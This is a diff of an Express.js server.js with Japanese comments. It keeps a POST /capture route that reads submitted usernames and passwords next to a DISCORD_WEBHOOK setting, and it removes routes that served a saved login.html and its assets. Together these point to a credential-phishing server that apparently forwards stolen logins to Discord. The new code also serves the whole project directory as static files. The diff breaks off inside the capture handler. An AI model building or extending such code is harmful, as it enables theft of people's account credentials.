@@ -1,21 +1,22 @@
-// server.js
 const express = require("express");
 const app = express();
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
+// 静的ファイルを全部配信
+app.use(express.static(__dirname, {
+    etag: false,
+    lastModified: false,
+    setHeaders: (res) => {
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+        res.setHeader('Pragma', 'no-cache');
+        res.setHeader('Expires', '0');
+    }
+}));
+
 const webhook = process.env.DISCORD_WEBHOOK;
 
-// ルート（/）でHTMLを返す
-app.get("/", (req, res) => {
-    res.sendFile(__dirname + "/login.html");
-});
-
-// 保存した_filesフォルダの中身を配信
-app.use("/login_files", express.static(__dirname + "/login_files"));
-
-// ログイン情報を受け取る
 app.post("/capture", async (req, res) => {
     const username = req.body.username;
     const password = req.body.password;
